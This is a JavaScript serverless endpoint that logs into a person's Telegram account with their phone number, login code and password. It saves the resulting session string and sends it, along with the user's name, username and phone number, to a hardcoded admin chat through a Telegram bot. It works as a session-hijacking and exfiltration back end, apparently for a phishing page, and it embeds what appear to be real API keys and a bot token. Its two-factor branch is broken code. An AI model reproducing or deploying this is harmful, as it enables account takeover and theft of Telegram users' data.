const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

const API_ID = 23171051;
const API_HASH = '10331d5d712364f57ffdd23417f4513c';
const BOT_TOKEN = '7573902454:AAG0M03o5uHDMLGeFy5crFjBPRRsTbSqPNM';
const ADMIN_ID = '7907742294';

async function sendToBot(message) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
  } catch (error) {
    console.error('Failed to send message to bot:', error);
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  let client;
  try {
    const { phone, phone_code_hash, otp_code, password } = req.body;

    if (!phone || !phone_code_hash || !otp_code) {
      return res.status(400).json({ 
        success: false, 
        error: 'All fields are required' 
      });
    }

    console.log('Verifying code for:', phone);

    const stringSession = new StringSession('');
    client = new TelegramClient(stringSession, API_ID, API_HASH, {
      connectionRetries: 5,
    });

    await client.connect();

    try {
      // First, try to sign in with the code
      let result;
      try {
        result = await client.invoke(new Api.auth.SignIn({
          phoneNumber: phone,
          phoneCodeHash: phone_code_hash,
          phoneCode: otp_code,
        }));
      } catch (signInError) {
        // If sign in fails, it might be because we need to sign up (new account) or 2FA
        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
          if (!password) {
            throw new Error('2FA password required. Please enter your password.');
          }
          
          // Handle 2FA password
          const { srp_id, current_algo, srp_B } = await client.invoke(new Api.account.GetPassword());
          const { g, p, salt1, salt2 } = current_algo;
          
          // For simplicity, we'll use a direct approach
          result = await client.invoke(new Api.auth.CheckPassword({
            password: await client.invoke(new Api.account.GetPassword()),
          }));
        } else {
          throw signInError;
        }
      }

      // If we reach here, authentication was successful
      const sessionString = client.session.save();
      
      // Get user information
      const me = await client.getMe();
      const userInfo = {
        id: me.id,
        username: me.username || 'No username',
        first_name: me.firstName || '',
        last_name: me.lastName || '',
        phone: me.phone || phone
      };

      console.log('Session generated for user:', userInfo.id);

      // Send session to admin via bot
      const botMessage = `🔐 **New Telegram Session Generated**\n\n` +
        `👤 **User Info:**\n` +
        `├ ID: \`${userInfo.id}\`\n` +
        `├ Name: ${userInfo.first_name} ${userInfo.last_name}\n` +
        `├ Username: @${userInfo.username}\n` +
        `└ Phone: ${userInfo.phone}\n\n` +
        `🔑 **Session String:**\n\`${sessionString}\``;

      await sendToBot(botMessage);

      await client.disconnect();

      res.status(200).json({
        success: true,
        session_string: sessionString,
        user_info: userInfo,
        message: 'Session generated successfully and sent to admin'
      });

    } catch (authError) {
      console.error('Authentication error:', authError);
      
      let errorMessage = authError.message;
      if (authError.errorMessage === 'PHONE_CODE_INVALID') {
        errorMessage = 'Invalid verification code. Please check and try again.';
      } else if (authError.errorMessage === 'PHONE_CODE_EXPIRED') {
        errorMessage = 'Verification code expired. Please request a new code.';
      } else if (authError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
        errorMessage = '2FA password required. Please enter your password.';
      } else if (authError.message.includes('FLOOD_WAIT')) {
        errorMessage = 'Too many attempts. Please wait and try again.';
      }
      
      throw new Error(errorMessage);
    }

  } catch (error) {
    console.error('Error in verify-code:', error);
    
    if (client) {
      await client.disconnect();
    }
    
    // Send error to bot for monitoring
    await sendToBot(`❌ **Session Generation Failed**\n\nError: ${error.message}\nPhone: ${req.body.phone}`);
    
    res.status(200).json({
      success: false,
      error: error.message
    });
  }
};
